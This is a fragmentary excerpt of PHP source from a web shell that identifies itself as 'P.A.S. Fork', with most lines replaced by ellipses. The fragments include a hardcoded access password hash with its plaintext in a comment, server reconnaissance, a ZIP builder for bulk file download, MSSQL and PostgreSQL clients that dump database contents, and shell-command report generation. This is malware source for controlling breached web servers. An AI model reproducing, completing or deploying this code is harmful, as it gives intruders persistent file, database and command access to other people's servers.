...
$GLOBALS['PASSHASH'] = 'd9c78861d68b23c6fa6ed9d624bec8521381ded351e3638c888f2427ac4635fe3d43bd1f74e775901f12852395ece3e2ee14939426c046b97c40e5aba1b6cf2f';//P@55w()rD
...
function infMain($h = FALSE){
	...
	foreach(array('HTTP_HOST','SERVER_ADDR','SERVER_NAME') as $v)
		...
		$r='';
		$a = array();
		if(NIX){if(defined('POSIX_F_OK') || function_exists('posix_geteuid')){
...
class FileInfo{
	...
	function getOwner() {
	    ...
	    if (PHP_VERSION >= '5'):if (!isset($this->fi))
	            $this->spl();
	        if ($this->fi !== FALSE) {
	            try {
	                $v = $this->fi->getOwner();
...
if(isset($D['a'])){
	...
	class PZIP {
	    ...
	    function fileHeader($n, $t) {echo "\x50\x4b\x03\x04\x14\x00\x08\x00\x00\x00", $t, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", pack('v', strlen($n)), "\x00\x00", $n;
	    ...
	    function close() {if (count($this->_flrs) > 0) {
	            $n = 'CANT_READ.txt';
	            $t = packTime(time());
	            $this->fileHeader($n, $t);
...
switch ($D['a']) {
    ...
    case 's':
        ...
        function mssqlEscName() {
            $a = func_get_args();
            foreach ($a as $k => $v)
                $a[$k] = '[' . str_replace(']', ']]', $v) . ']';return implode('.', $a);
        }
                    ...
                    if (($v = pg_exec($this->_cnct, 'FETCH NEXT FROM c')) && ($v = pg_fetch_array($v, NULL, PGSQL_ASSOC))) {
                        ...
                        do {
                            if ($d)
                                ...
                                $d = $f ? ',' : "\n";
                            if ($f)
                                sqlOutValues($v, 'pgsqlEscData');else
                                csvOutValues($v);
        ...
        if (PHP_VERSION >= '5'):
            ...
            class MSSQLODBCClient extends MSSQLPDOClient {function connect($h, $u, $p, $b, $c) {
                    $a = array();
                    if ($h !== NULL)
                        $a[] = 'Server=' . $h;
                    if ($b !== NULL)
    ...
    case 't':
        ...
        if (in_array($k, array(
            ...
            if (NIX) {
                $t = "echo ' -------------------------------------------------';";
                $h = 'echo;echo;' . $t . "echo '|'  ";$v = "echo '*  This report created by P.A.S. Fork v." . VER . "';echo '*  '`date -u +'%Y-%m-%d %H:%M:%S %Z'`;";
                if (strpos($i, 'o') === FALSE)
...
function sqlSaveState() {
 ...
 strgSaveStr('sqlRPP', elmById('frmPg').r.value);strgSaveOpt('sqlSendAs', elmById('sqlCSSend').value);
